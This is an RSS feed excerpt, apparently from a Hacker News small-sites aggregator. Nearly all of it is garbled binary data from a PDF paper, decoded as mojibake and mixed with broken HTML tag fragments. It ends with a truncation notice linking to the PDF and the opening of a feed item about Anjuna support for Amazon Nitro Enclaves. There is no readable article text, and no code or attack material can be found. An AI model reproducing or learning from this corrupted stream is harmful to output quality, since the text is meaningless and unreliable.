√ö¬π¬ºh9√ò¬¥L√å√Ü√è¬¥√¨l√¨≈∏¬ß‚Äú7¬∞√∏?√©0√º√ãW√Ç√ñ√î√∞i√øW√ö√Ü.√∂√ø‚Äò¬∫√´?T&nbsp;√∏K√Ö‚Äù‚Ç¨¬ß‚Äô¬µs√æ√¨ ‚Ç¨√¢√øB≈Ω√ö≈∏√¢√æ√ü¬´√∞ÔøΩ√∑√±i3¬∞2√º√∑√∫√ª<a√º√ø‚Äú√†_¬Æ√øey¬º√®√æÔøΩ√ø≈°√ª√£√¥?4√ΩÔøΩ√´√è√ø¬µ√†√æs1i√ø√Ø‚Ä†√∫√øi‚Äù√ø√ó√º? √≠√øbt√ø‚Äù^√î√Ö√ö√∫¬Øa√∏="" ‚Äö‚Äúp6√∏¬º√ä‚Äì¬ß¬®ÔøΩÔøΩ‚Ä¶¬µ√á√´√±≈∏m√ïl√æ<ÔøΩ="" a;;¬´√øb¬£√¥√∑i√πg([3kÔøΩ-#√ì?6-≈ìd-√úm≈í√•-≈ìÔøΩ="">Kh`√≠d√≤ÔøΩ}‚Ä¢?-¬≤√æ≈í'o√ßd√±WAi99√æ√ì‚Äò¬≤¬π‚Ä¶‚Äò‚Ä¢¬≠‚Ä∞‚Äú‚Ç¨√•√ø‚Äû0p√∫¬¨¬∞3‚Ç¨ÔøΩ‚Ä¢√•/l√≤√ô∆í√èH√Ñ√ñ√à√é√∏O¬ß‚Ñ¢X√ô≈Ω≈Ω0≈∏ÔøΩ++√Ä‚Äπ`√±√â√¨√∏√¨¬°9‚Ç¨≈æ√é√ñ√é√π√ì`√Ø√¢√¨√≥√ô[GÀú?¬≥√ç√Ü&nbsp;√º¬≥√µ√Ñ&nbsp;√∫√¢√ê‚Äπ√º¬±¬≥√®¬•√æ‚Ä¶&gt;-e√æ‚Ä¶8√¥¬≤√øB≈∏~r√øDz√π¬°O‚Ä¢"√éO∆í"F‚Ä†OS√£¬øAF¬Ω√â√ü ‚Ç¨√û√¥oÔøΩ@o√æ7√∏Il√±7√∏√âl√µ7√∏‚Ñ¢&nbsp;√µ√ü√†g‚Ä†6√ø‚Äö≈∏o4¬Ω√≠√ü√†g\¬ª¬ø√Å√è¬∏√∂∆í≈∏q√ø?√£:√Ω
~√ñ√ì√π/√∏om2rqt√º√¨√£_O√™g√ø‚Ä∫Z|*√á√Ñ√Ñ√ù√Ñfi√û√éÀÜ;√ò¬≤&amp;√∏√∑c‚Ä¢≈Ω√≠√û8|√øu√Ñ-‚Äù√ö¬Æ‚Äì√´ÔøΩB&nbsp;√è√ì
s^√§¬¢@√ß√¨~√§√ì&amp;√≤	S√ëG¬£‚Ä¢::∆í‚Ä¢√Æ‚Ä†wJ$√∫R√ùopS√É√ØId√û√ß'i¬¶}¬©≈ΩM}f[c3√¥‚Äπ&amp;√ÖA¬∑√õ¬Ø3‚Äù4W{s√©Gb<dm√•√¶ÔøΩ√§ ¬ßtp="" √£√ü#!198Àú√°@‚Äö√õ√í√õ*¬´ff√õ%h≈ì¬Æ¬ø≈Ω≈∏%√†‚Ä∞="¬•√¥ÔøΩ0¬±n√∑/‚Äî√êÔøΩ[l¬•√†√É√õK√ù¬¶√≥%v¬≥aK√©OfHw¬ªE0_b)oP:ÔøΩ√ä√á¬∞R‚Ç¨" ≈°√°‚Äù¬≤="" √â,√†.bo}√ôn="" k√π√∂$¬Ωf¬µ,="√í√ú" √æ‚Ä∫√í="" √ª√ô√Ωi√®√™%'d‚Äö)y¬µ="" \x√É‚Äök√§g-√íÔøΩ="" o√üw√≠ÔøΩ√ã="" √ô‚Äô√´¬™`√®7¬ª7√¨(√î√≥]√ü¬Æk+ny¬§¬™√ü="" √ãrl="" √ôv≈æf%"f¬´√¶√ï}√ùÀú‚Ç¨5g}¬≠-s¬¢'xfy="" ¬±v√ö¬•‚Ä¢hn√éÔøΩ√Æ√é$g√ú√∏{v]o_zytxÀÜ√¥√ú√ú¬Ø,¬ª≈æ√É)≈°y‚Ä¶bc√ñq6q¬Æ¬§tf5i\√û√´q√Ü_nt¬†√ß¬™2‚Äπ√∂¬æb√â≈∏dfsq√ë√ß‚Ñ¢i~√≥e2u¬©¬µ√ú¬¨√ö¬†¬Ø√é="" \√áy_√ó√¢="" 8√õ√≠√ã√ª√π3(e2b="" $mz√µ‚Ä°a7¬£¬¨¬™‚Äú="√ä√ï√ê√ÖP√ö≈∏r‚Äôv‚Ä¢√°u9}√∫l0¬≥‚Äù¬£;‚Ä¶¬ØI√µ=√è¬±√∫√æ√∑‚ÄúÀÜ√ß√ª='(√éf√∞√Æ7S-th√Ø√å" √íd?¬§]√ñz√≠√¢¬°√≤ÀÜ¬∞,√ä√í≈∏¬Ω√æÔøΩn√•¬¶¬π√¨√æ≈°√Ø√∞≈Ωh7‚Ä∞¬©;¬µ‚Ä∫4¬§¬∞√∏¬¢√Ö]¬®z]l√•√ßÀÜ√Ä7√ö√Å≈ì‚Ä¶√ã¬©tv√†9‚Ñ¢√∂0f((pts√Ñ‚Äò¬±o√ñ,∆í√à¬°b√Ö¬¶$wkl¬¨]z‚Äôut√≤%2¬±x≈Ω(1√ªn√üuq2∆í#√¥`‚Äû√£m√§s≈°nh√µ¬≠¬∞¬∂‚Ä¢ÔøΩ{ÔøΩ√à;√Ñ√öÔøΩ√ñÔøΩ√∏√£a√ó¬£≈íÀÜbbe‚Ä¶√Ä≈ís√ò¬¥¬©√Æ¬∏%"√îÀú√°w]ÔøΩ√≥≈í‚Äôm√í¬™#‚Äî="ÔøΩÀú≈∏√¥¬´‚Äùo√Ü√ªi√é√∫√£‚Äû(?AJ¬®¬º√ä¬´" ¬∂‚Ä∫z*ÔøΩ√∏√¥‚Ñ¢√Ü3w√æ¬Æ√´¬∂≈í√´hn≈ì√Ø‚Äûa√∏:√ú≈íd√¶‚Äû(qj≈Ωs.√Ö+√øu¬∑*√éid≈í√ò√≥tÔøΩ√Å‚Ä∞¬Ø)√∫y%¬º¬æqs√Ç√ïf√°√á¬º‚Äî≈í="" a‚Ñ¢x62¬∏¬¢√Æ="" √≤√£√®¬ÆÔøΩ%‚Ä∫√ìu‚Äù@√Æ¬∞¬ße\<√Å‚Äî:¬¶¬º1(z="" √óijb*="" k√àk≈Ω∆í‚Ä°≈∏¬©id√°¬°√≥'bf)¬ø¬µu√èbi:ÔøΩ√ç2qh¬µg√Å√±√≤√ùÔøΩ_√•i√°√º¬º‚Ä†pn0¬ª¬≠!‚Äî√Ö‚Äôc‚Äù√ì¬≥)}="" *‚Ä¢qh¬ß≈í:h‚Äö¬∂√ëlf¬§¬¨‚Ä†√úp‚Ä∫√º√∑√∞√ù‚Äî‚Ç¨6√ë+√®¬´¬Æ¬ª√∏ÔøΩ¬¥∆íp‚Ä∫√£≈°ÔøΩ∆í√ã3√àbe√´‚Ä†√é;√∞√º√ô?√á√©6√ñ¬§'√á√Ü√∫‚Ä∫√≤√º√û¬∫√∂u6√≥r¬©:√éÔøΩ4dik‚Ç¨‚Ä∫j¬ø√Ñ√ï%√è="">√§√è√è√∫ÔøΩ¬ß‚Äô√ó√ß√ûr‚Äì√â¬¨N√¢¬∏5|Q≈∏IXAuZÀÜ√Ω√Ç{√©6√ø√Ö√Ü\3W≈í√ûIRm√Ä√ê¬Ø√≥g¬¥=√¨√ÄX7(¬∫√Ç√ñ√∂4√∞^m√è‚Ä†≈í,√™ÔøΩ‚Ç¨7y¬¶ÀÜ√Öb‚Äô√å√®
gu√Ç
&lt;¬∑[~√á√®¬∂¬Æ¬§‚Äö¬∞,H|%d¬∫‚Ä¢√ñ8l¬•dUkhi√û
¬æ√É/:l2∆í√â√öbC<m√ÖiÀú‚Ä¢r √êd¬¥.[&√§q^a="" m√ñ√Ç="√Ø≈∏8≈°√â√¶7P¬°Àú√∑xdÔøΩ¬ÆHE`i" ]k√Ö√Ç√µ√í¬≠e¬®f≈°√ì¬°¬©√òb‚Ä†√§‚Äπ≈†√©ÔøΩ¬£]≈ì√π‚Äôh√º+;i‚Äû√≤‚Äö‚Äòx√∂‚Äû√≥m="" 1[√ª√ê≈∏ÔøΩu¬Æ¬•&h√æ¬•√î√§[√í¬®`√åk√≥v√è√û√°¬æ‚Äù<√æ√π≈°≈°+b√êr√°ÀÜÀú"√Øn√∞;√º¬ºo¬µ√∏a∆í‚Äò"je‚Äù‚Äû√•√∂¬Æ3="" c}hqÔøΩ="" ÔøΩj√ç7ÔøΩ|j√ç6!3√ë≈∏√Ñ¬¢≈°rj√ûl="" ,‚Ä∞^√é="" √Æ√á≈Ω_k√ê√à√ô√∑√®√§√¢p‚Ñ¢¬Ωp¬™9≈æÔøΩ≈Ω‚Ñ¢√£.√¶¬¶¬µÔøΩ¬Æ√ó√ù√®%i="" √∏√¶1¬™08‚Äù¬º<ÔøΩ¬µ√í¬™w¬¨"√ìn√Ü√≠ÔøΩ‚Äπ≈æ√∫r√ë(≈íd√≥√≠√∏!qs]="" ¬¶}√µ√æ‚Ñ¢¬¶≈°√ùg¬Æ√•3v¬ß√Øbt‚Ñ¢)√∑ÔøΩ¬π]h√ä√îs√ã√∞√®ÔøΩy√¶ÀÜ√©5√≠¬§√©:√´g≈ì√â√≠√ïoÔøΩ√õ√´c(josi-ÀÜ-b¬∏¬®xo√é‚Ä¢¬Ø¬∏_¬Ø(¬†x~x.√õeÔøΩy5@¬øl√π√£√™√ë√∏d6‚Äò√Ω(√áeqm;¬ª¬∫="" √ñ0lky¬π"zn¬∞√Åzp√•¬•hÔøΩ√†‚Ä∞√¥√ö,¬π‚Äî√ª="" ¬£*√ü‚Ä¶w√èÔøΩ√ø√Ü2√§√∑√æ≈í√ô√ú√ç√ª√ànac¬π2√¶√Ç="" ",1ac√É¬©‚ÄûtÀÜ√Ñp¬Ømp√ªpb√±¬°√û√≤="" √®‚Äû√ßeÔøΩ√Ñ¬¥√†¬∏¬¶√é√µ√≥m:="√Ö?¬ß√ö√Ω)0" ¬¥^,¬Æ="√êy¬µeh{+√ã√†‚Äî¬™√å√•R√à√°ÔøΩ√•¬°D¬©¬π√°√ª√Ö¬∞a¬Ωr√≤√Å√™√îR¬∑&nbsp;¬Ω1.¬≥≈íjF*¬ø√∫‚Ä∫nK¬≥¬∑:‚Ä∞‚Äö¬´√à√¥S√é,~√∏&nbsp;w√îE√ã‚Ñ¢">|√ûs√´≈ì:√í√¶u√¢¬ΩB√Æ¬ÆTG&amp;‚Ä¢√≠8√¥¬¢√ª√ùÔøΩ0&nbsp;√°√Ç√ç√¥6√øU√±t√å:¬∂&gt;ED‚Ñ¢ÔøΩ¬£6√º¬£¬∑√©	&nbsp;?√ö≈∏¬≤Zi≈Ω‚Ç¨√£√µE√≤:‚Ç¨|√êQ‚Äö^H`√ß‚Ä∞√´y&gt;√∫4√¥c‚Äî‚Ç¨K≈†√™√Æ√ê¬¥¬®¬Ø√å√û	'W-I√Ç‚Äú√Ü√´X¬¨ÔøΩ√≠&gt;6[Y/√é¬®¬ø.}‚Äπ¬πJ√≥~S<w¬±¬Ø¬Ø√¥w*‚Äû2¬®y~ÔøΩj¬±√†¬•√ô^¬µ‚Äö^≈∏‚Äù:‚Äò¬¨f¬∏√øci`√ü√í√ãh‚Äîi√©¬¶xz‚Ä¶‚Äú√°√™ &tt√å≈†nt≈æ&√ê≈ì√ñ¬π¬Æ√ª≈æ√¥g_|√îrx√∑q(¬∑wsqp√ì3k¬©i√º√É‚Äò¬©!,tl√ëp√ª¬¨="">√ä√©¬±q‚Ä∫¬¥√•≈ì^¬µ¬π¬ø√±√ó¬Æ√õ‚Ä°f√é√ãM√¥√ΩU√ë√¨h√úÔøΩn%¬£√∏V2≈∏‚Äö¬¢¬≠|j√ØPO..‚Ä∞y√á√∑√Øxc¬≠‚Äπ¬±¬∞g≈æ√üZ¬µ[h≈íÀÜ¬•‚Ç¨A‚Ñ¢√ßA√ïo{voÔøΩ%√á!√ë√ë¬¢T‚Äúq@A√ô√•√º√úD√§L¬Ω‚Ä¢,√ë(&amp;‚Ä†7drkÔøΩ¬∂|≈∏¬∞√¶Ez&amp;&gt;¬æ≈°‚ÄúD %‚Äì^¬øP‚Ä∫√õ√Ö√ç‚Ä¢	‚Äùt√™√É5E"¬æÔøΩG{√ûc‚ÄûKSMe;
√ò¬∫√Ä‚Äì√Ñc‚Äì7√ë¬•;¬•¬´¬π+√Ç√íÔøΩPU‚Ä¢ay9t
[¬≥√ë√∞M√ú 80g;~≈ΩÔøΩ ≈í%8√ÑÔøΩ1¬¨/Àú≈∏¬¶¬µ¬æV¬´√ë√û¬´√ä‚ÄπiHs-√©√Ω√Ü√®c%√æ√∫¬º√∏t√ú√µh≈Ω√ÑÔøΩ¬øTm√£‚Äör%√ü‚Ç¨%ÔøΩ√§¬´√∞69¬ª.=‚Äπ¬ªD¬Ø√∏:√ª¬≤k‚Ç¨Ts√ó√∫$/‚Ä¢√Ä:√Å¬¥1¬≠i%√®K¬°¬Ω¬¨√ù√ú;By√É~~;¬©‚Ä¶‚Äö2¬±¬¶D√ì+
s√èa√¶√°√ñ\L¬®dX√¥kv¬Øi‚Äö√ä‚Äπm√®K√±‚Ç¨√Üw¬¥ÀÜ6√©¬º√î¬Ø√ôv¬´¬∞√£)¬æ¬π{√°0wb√§√ª
√ª√æ√°NzU‚Äû*¬§m√å√ë¬™Su¬°%S`{~√´‚Ç¨¬ß‚Ä°∆ín√π&gt;√ô/6bG¬≥√ú√¥^^yJA√∫√®¬¢¬≤√∑≈†Sp|ÀÜ√Ç&gt;√≤_√µ‚Ä∞6√áW≈æUg¬ø‚ÄìZY‚Äù¬§V√Å"√â√πÔøΩ$,√∫]√∫¬∂√º&nbsp;≈∏u√é_Ys¬º√î√àÔøΩ6√ó√â√≠√Ø√¢√∫√†3≈†‚Ä†¬™]I^&lt;¬ßO√éY+"9¬§7¬π√Ö√ö√Ñ√≥¬µÔøΩ√≤hÔøΩ5√∫&amp;V√¢‚Äπ_¬≥√§¬æMy√™"√≠F√£9)Ia√∞√ëJ√í√ª√¨¬ª¬®√±v¬µ√°\&lt;‚Äù≈Ω	√ó√á√°ÔøΩq ≈Ω√ö√≠√Ω√™√Äu√≠dDqN¬æh√≤Z√°‚Äú√ñ√¨x‚Ä∫#J√£h√õby√¶~O{¬•x‚Ä∫√îcx¬£RS≈†‚Ä°√¨b√°#¬Ωa‚Äô¬£&amp;¬Æ√º[√°√Ω$j¬ÆSÔøΩ√®‚Äù:O0R]?‚Äûz√ú¬π¬Ω√õ√õ‚Äπ√è√£k/bb≈ì√µ$‚ÄπG√≤√¨I√Ö√µ√ó¬¢‚Äπ¬©¬≤√ç¬£‚Äò≈∏nZ√Å√∫dK‚Äò√∫ÔøΩP(¬ßP‚ÄôCA¬∫¬∂3ÔøΩdF/√ØT&lt;√ü%√´√≤√ú√üN√©¬Ø√äLe‚ÄûNU‚Ä¢¬∑(¬Ω≈í√¨≈†¬©√ò(V≈íc[p√ó.ÔøΩ√Ø]puk‚Ä∫&nbsp;√∏d√ª¬°¬•√∏‚Ä∫√É√¨√§2R√Ω√ºNÀúx)√∑¬≥Th+E√û√â√Å≈Ωd≈∏√ú≈æY,~¬∞¬©√æZ√â]9\¬¥¬≠∆í√òk√äYY¬∏√Éc¬±≈∏i]‚Äì√ì≈æ¬≤IA¬§Ed&amp;√í√•≈ì≈æ8%√íNn√£√ù≈∏K¬æ√ΩAmC√ì√â√õI√ø√Ω≈†M‚Äò√Ö√∑¬´√≤,ÔøΩ	√é‚Äì√ï√îÔøΩ‚Ä¶‚Äπ√ñ¬´√à[~√≠√≠¬±1+&amp;¬¨√ï3‚Ä∫¬°‚Ñ¢¬ßQ‚Äô√å¬§¬µ8√†.√¨√Ñp‚Ä¢¬£C√ò¬¶_¬ø¬©√∑√±¬∑9b√Ñ√†g√∫I√®J√ñ3l¬¢¬ß√ß%√ç≈Ωw√ê%√£#¬∞]$√á√õ!¬¶√¨n‚Äô√Ç‚Ç¨Q√°kM√ÉQ"¬≥∆í3‚Ä†%√ô√ò4√ù¬Ø¬∫‚Ä∫‚Äî$√ù¬°‚ÄöD√∞&gt;¬Æ!≈æP≈†3e"v√ú¬≤≈Ω[√≥√§√∫=‚Ä¢¬æ‚Äì5C√ù√û jÔøΩ‚Ä¢√Éd√Ω&amp;√Ç1i}‚Ä¶4√ù√°{y$0ÔøΩl√â¬ØB¬Ω	√ñF‚Äìj≈°cPJ‚Äö&amp;‚Äô√Ü√ùx#√æo≈†√®√¥|(M¬≤‚Äò√Ü√ø√Ö¬¨dl‚Äî√Å6[*‚Ç¨‚Äú¬Ω3√ª¬±W¬Ø*‚Ñ¢√∫‚Ä†√î√™¬Ω¬¶¬∫¬•‚ÄöA√îBv√∑mr¬∏‚Ä†x[X5√Ä&lt;√èwZ+¬æ√Ç√Ü√≠√∫√£√ÄÀÜ‚Äú√°√¥Q√ß¬∂¬∫?√¶&amp;√£ÀÜ‚Ä†‚Ñ¢√±$¬©hl√≠√ù√à√ø$¬∫‚Äù√ùf¬§√πe‚Äî¬£√¨%O¬Æ√ê¬≠c∆í√ÑPF¬µ‚Ç¨√ó≈Ωaf9∆í¬¥√á√Åw&nbsp;(‚Äû√óm√ß√º≈æzÔøΩA¬¶√ÅÔøΩ√®N%¬øFIÔøΩÔøΩN1√Ä√Çje√∑ÔøΩ=√á¬°¬∏‚Ä∞√∑¬§ÔøΩ6√å√ÜT√à‚Äì∆í√π√Å√àv√í√â√µwm√Ä¬¢¬≥√îA'¬®√Ä^≈°√º¬¥Hb¬°√≤q¬ª≈í¬æ√¨≈í≈æ√≤vq√Ñ5xÔøΩP¬æ¬¨=[‚Ä¢√ß‚Ç¨}¬¶l;√∏¬≥!‚ÄúÔøΩ¬≠√†√®&amp;¬∫F√â¬≤√á.?¬≥'niY;4/[√π'‚Ä∫√Ñ&nbsp;Àú$√¥f√á√Ñ¬æ√®0¬¶¬∞&gt;√Ç{p¬¥√¥√∏S√õ7o¬Ø√ó‚Äù&nbsp;√Ø√ß√¢¬≤‚Ñ¢.¬æ√Ω¬®√º¬ß¬π√Æn[L¬π≈†‚Äò‚ÄùC¬∞&amp;‚Äö√Æ√ñ√£√•-d#$≈∏¬™√Ü√ò¬∞√É¬º‚Ä∞1f √éz!∆í¬±√â
'4≈†dzj√å√í‚Ä¢_=#≈íN√≠$√ÉV√ã,V√®7√≥(&gt;P√´~&nbsp;‚Äù√≤√âk¬Ω¬©w
‚Äú√ªRP√ô√ê√Ü≈æ¬º≈æ√π,63√è√ìFU)¬¶√Ç¬µ√ü¬ªÔøΩ¬≤9ÔøΩ)AUZ√ùaw‚Äù√´*√Ü√™t+_¬∂√ª‚Äû¬¶TUÔøΩ√û?¬ª≈°√æ≈í;1‚Äô√ît|9ÔøΩ√õ¬∫p√∞√™√ØJ)‚Äîb≈íI(‚Äû¬•b‚ÄûHw√µ√ß¬°x‚Ç¨=Khj¬°1‚Ä¢¬¶ÀúTM}¬≥√∂6√ãÔøΩHk√û¬•KUhi¬∑≈∏‚Ñ¢∆íw≈íÔøΩ√≠O0√õ√è¬®√§√õ≈ΩZ√µ q#√äX¬©¬øÀú√¢√ó¬´\(√á]t√î‚Äì≈ìFU√Å√âN√∑‚Ä†f3/d¬ß¬ø;√¨‚Äô√∞n?I√Ä√ä7≈°Q√Ä√ö¬¥√õmQ`X¬ØG‚Äû¬©√Ñ4=√ã[√†≈Ωv√ál√ú≈ΩM√åy+F‚Äò¬∞√®(‚ÄöK¬©√≥√±√´≈Ω‚Ä∞√Ω&nbsp;¬®&lt;¬±√°√ò#‚Äú¬´≈í√Ç7√±$ÔøΩ≈∏√ø‚Ä†cÀÜ√â:¬π‚Ä∫&gt;ÔøΩY√Æ√≥√î√©ÔøΩ√Ñ¬ß¬≥K√ô√ã√≥cN	√∑√ó¬©J5≈†√£;√ó¬¶¬∂q√®√Çn≈ìMO√â‚Äò√ê√£√é‚Äú√É√ñ5¬™‚Ç¨¬ß√î¬¶√ï`'√®‚ÄînR‚Äô√êU√¨4N√úeX‚Ä†√ç‚Ä¢dUQu'C
(‚Äû:√ôI√è‚Äù√¥‚Äù_@	√¶8‚ÄöX¬∏_b.ÀÜ7√®a~√≠√π¬ºK¬≥WD(√®¬¢√î.‚Ä¢¬±&lt;¬∑‚Ä∞√™√∂&nbsp;≈∏‚Ä¢f√ëh√ñ√ç√ú	√ñ√ª‚Äì√ÖQ√°≈Ω√áF:¬™√ÖH√ê√ØK√º¬∏√π&gt;B¬π)w‚Ä∞P¬¶√Å¬•V√û√±¬≠Àú√ô√¨q√∏9c1J¬¥√±¬Ω√∂√ê=√§W‚Ä¶√í√ÅYobi}#√∫√∞pÔøΩ√Éy√É‚Äô¬≥9√ê‚Ä¢*‚Ä¢¬¨|¬£=‚Ñ¢≈ì√µ¬ÆÔøΩT√∏√∞√òf&lt;2¬æ√ù√æ√ôq≈∏0√Åk√¢√¥P√°‚Ä∞√åa¬§|/_
)C√É‚Ä¢C
√™0pD√û√Å¬§*¬§√á≈†#√∑/#√æÔøΩe√∞¬®.√äWKÔøΩh√¶¬∞ÔøΩx√©V√ñm7√ü N
¬∂W√¨√ç√∑‚Äî:
[W-¬ª√§≈Ω¬ª√≥‚Äök≈†¬∏√üi|√¢√≥,{\¬´ÔøΩ¬´¬Ø^√∫ÀÜ√®bx√≥R‚Äö≈†r5 ¬™¬∞n√á*√™¬º¬¶d¬Ω√ò‚Äù√®√©√ÑYÔøΩ+1√í¬≤‚Äπ√∞¬§\√å‚Ä†]¬∂7%¬∞¬©}LMN√£¬∂√ä√ä¬¶¬∏/*¬©√å}√©&nbsp;√Ü¬•S√üQ√∂[F(√§√ï‚Ä¶√ü|¬ª"T√ö√™√£¬∫O√§√ª‚Äô√ÆPr≈∏Ey‚Äò√ù¬™,]√ã√Ç≈†?P√úy"√ò≈°Q‚Ä¶Q√ô¬¥]ZJ¬º√£g√Ωi,jUj%¬°√°√ñ&nbsp;
q≈∏~+‚Äû¬•√ño¬ßj¬¶b√æ‚Äö√¨t‚Äö¬®√°NÔøΩ&nbsp;√∂‚ÄôA√Ü_G√ã¬¨ÀÜke"dX¬¶¬≥√≥=ÔøΩ¬°q‚Ñ¢√≤S√∑√Ö‚Äù¬©/3Bz≈°¬∞a0Pd*√üÔøΩ√≥√ú=¬•+¬¥tÀúz#√ô‚Äú√û:q/ÀÜ√ó¬Ø¬§√®√ài∆í√ü¬•`wÀúU√çcl'Bee‚Äû$¬∏√Ü√§√†√•¬ß7√é&lt;]R¬º≈°¬∑m/s¬•√õk m¬§f√ërc8√É¬∏Àú"E8&gt;"y‚Äô%√ô/√ú√´&nbsp;)‚Ä¶‚Ä¶J‚Ä°&gt;√Ç∆ív¬º√ñ 3/√´[¬¨‚Äô¬µ√èB√∫d¬±√úi[¬°U¬µNb√ö√Å∆íÔøΩe√âWKÔøΩT√°t‚Ä¶√´√Äy√ª{¬©QsL¬´ÔøΩ3√à√¥√ê√±|:¬ß_√å≈Ω√¢√™√≠$√π√ó√∫√ª;U√Öd¬±
√ú¬Ω.U4r¬≥9Oy√êE√º¬∏StC√Ø√©√∑
F√©√ç‚Äö\J¬§_√ñ√¢b¬Ω_M‚Äô‚Äù¬©√â‚Äö√Æ¬æ0√ß¬•‚Äî√ì¬≥:¬ø¬±¬∞Z7
√ã
√ç]ÔøΩ√ä√å'-√≤¬•√§@¬¢3q√ä√õj√éh¬Æ{¬ø√ûp¬§¬°M√≠‚Äπ_
‚Äì0u¬ß√î1√≤ÔøΩ√äO√óXP√≥√ù√Ø√î_'¬´√Çml¬©p√ï√ä	QfeGC¬¢(‚Ä∫¬øE¬∑m√©
√çV≈Ω¬®√ù≈Ω¬ª¬´‚Äò√ò26√°1¬µ√àP‚Ä†1√É¬°(j¬®¬Ω √õ√©3√Ö¬´¬©√ü≈ì‚Ä°√ÇCE≈ìL'
{∆í√ö=-¬•√öNÔøΩ√Å*√¥E√´√®X√†4¬´¬¶√Ü=√å¬™=b
/Stj*√ø√ä#]√Ñ√è√∑√¢‚Ä†√¨^‚Äπe
¬¥5¬¢hA5hd√èSGd@√ª¬Ø‚Äúh√º√§¬±/+BaM92c!¬ø√ó¬©[√Ü!≈ì‚Ñ¢√ç¬§&gt;‚Äìg‚Ä¢¬¥¬£≈Ω‚Äò"&gt;,s√Ü¬øZ*¬µjk‚Ä¶a‚Ç¨√∂‚Ä†Zl,H‚Äô=`ÀÜ‚Äì¬§¬®ÔøΩ√ßG¬•‚Ä∞ÔøΩ√Ä√¶√Ä√≤ÔøΩ√°C√ùb√íc4¬∞E1[√ö√Ä/¬©‚Ä∫¬±y8‚Äú√π√é√øÀú¬ø-¬∂√®o?W√ù√∏¬£√Ä√ä¬¶Sb,}eÔøΩ√©v√ùG‚Äû√Ö√ã¬±¬æ√ò&lt;√±√ê√≤Ab√∏Fz(¬¶ÔøΩ¬∫‚Äò?'√¨yu√©¬æ‚Äöc¬ø¬π√Ω√î√ª¬±4¬§¬°√ê√≤‚Ä∞HV≈°7Z√Éjt%√π‚Ä†P¬∞ÔøΩ+‚Ñ¢&gt;√Ä√π‚Äì¬∞√ä1!
√î¬•‚ÄìU≈Ω\;‚ÄòÔøΩiGb]sQ&amp;¬¶‚Äû√Ñ.√±√∑R¬≥H‚Äöx√¨‚Ä∞∆í¬∫¬≤¬∞^√∫i&nbsp;√è¬π≈∏w√¶]iU&amp;¬ß√èbN√¥√ù&lt;=¬Ω√éR¬ª;√ø7&nbsp;&lt;.rl¬™&gt;	√Ö¬π&amp;r≈í√ÉL√î√Öt1√≥‚Ñ¢¬º1¬∏byN√∂k¬±√©≈í√Ñ√ëQ¬∫‚Ä°‚Ñ¢ÔøΩ@W:y√†√Ö\∆í X¬¥√≠√Æ√ç1√Ç¬µ√ó√ß√õ¬©0?e&nbsp;‚Äπi√±√Ä¬¨√å√èZc√∂‚Ñ¢¬æX√ë7√ü4√ß~√åKtW';_‚Äò√ñ√õÀÜ¬¥no{"√ù√ì√äw√Ø¬≤04√ôÔøΩ≈°R1C_‚Ç¨¬±√¢≈æq‚Ä°SÀÜ0‚Ñ¢( \ÔøΩQÔøΩh√Ø‚Ä¶`{¬¢,√®&lt;√å/8V}:0,√¶¬§√¶s√¥‚ÄùM=Ii√à¬±√ùÀÜÀú8tmKFÀúg√º≈°6√¨]	5√∑√∑¬©√áBU‚Ä†qF¬ß¬≠o¬£√ë?√∑≈ìÀúJÔøΩz¬∏p√©√Å√µ‚Ä¢√∂-!nÀÜ√´√∫R‚Äô√£u√Ñ√£;√ï¬°}l≈Ω√úÔøΩ&amp;1√ç√Æ√î√ê(z¬§¬©cz≈Ω√¢¬ø√â¬Ω'¬º¬±d¬∫‚Äú¬ΩIO9√óv√©√£¬ØH√ø¬¢ÔøΩ‚Ä†‚Äú1H¬∑‚Äû√ã*√Ü¬≥√§‚Äπ¬ª≈ΩU=D√®w√ß‚Ä°¬≠√ê;√â*¬©f¬Æb¬µ3¬∂√©√Ø,¬¢√é]‚Ç¨4√Ö√∞√Üug√£¬øN_XA¬®‚Äì‚Ä∫MG√ÑÀúÔøΩ√Æ‚ÄúPy√∫p√≤
43√è√§!-√≤√ìh√ëE+7Q"‚Äìc¬™¬©≈æ√®‚Äò5¬¶ÔøΩ√û‚Äì¬≠ÀÜ¬Ø0K&nbsp;:‚Ä∞≈Ω¬Ωy‚Ä∫¬º)≈∏≈í√±Y√¥aÀÜ√ê¬∫RE√™¬Ωs√©‚Äî¬Ø√æ√ò¬®K√û‚ÄôY=v¬≥√ò√ó√ó√îID%?/9z‚Ä¢W¬≠√û√Ø '‚Äô√ç√ô
@√≤‚Äú7K‚Ä†E¬≥‚Äò√ª?5ÔøΩaa¬Ω¬Ø√¢;[≈†√°d,√â√°Àú3q‚Ñ¢√èy‚Ñ¢√µÔøΩ8¬ø√Ø√ë¬¥√ë√≥¬®√°\√®{¬ætÔøΩ√±√¥ÔøΩpt'¬§∆íF0‚Äû√à¬≤¬•√í¬ºB¬∏BN√ê'√π¬©ÔøΩ√ç1S√†ÔøΩ¬≠¬£√ëE¬¥‚Ä∞√Ån[
e√≠A√π5y¬∂≈Ω‚Äö`¬∫</w¬±¬Ø¬Ø√¥w*‚Äû2¬®y~ÔøΩj¬±√†¬•√π^¬µ‚Äö^√ø‚Äù:‚Äò¬¨f¬∏√øci`√ü√≤√´h‚Äîi√©¬¶xz‚Ä¶‚Äú√°√™></m√•iÀú‚Ä¢r></dm√•√¶ÔøΩ√§></a√º√ø‚Äú√†_¬Æ√øey¬º√®√æÔøΩ√ø≈°√ª√£√¥?4√ΩÔøΩ√´√Ø√ø¬µ√†√æs1i√ø√Ø‚Ä†√∫√øi‚Äù√ø√ó√º?></qfb'√ª‚Ñ¢√∏¬∂m√ª√æ3√Ø√Ω√æ{√ø√ª√¢¬Ø¬Ø√æ¬Øn√µ¬Æ¬≥√∂√Æ^√Ω¬ª{√µ></f√ΩaÔøΩ√µ√ª≈æ6}√®rÔøΩm√®√Ωa√°3√øewn?&¬ßy+√ß√™√¢lv‚Äì!#¬π></kr√ó‚Äì></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://aleksandar-prokopec.com/resources/docs/p137-prokopec.pdf">http://aleksandar-prokopec.com/resources/docs/p137-prokopec.pdf</a></em></p>]]>
            </description>
            <link>http://aleksandar-prokopec.com/resources/docs/p137-prokopec.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190123</guid>
            <pubDate>Fri, 19 Feb 2021 05:35:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anjuna Support for Amazon Nitro Enclaves]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26189898">thread link</a>) | @boxstream
<br/>
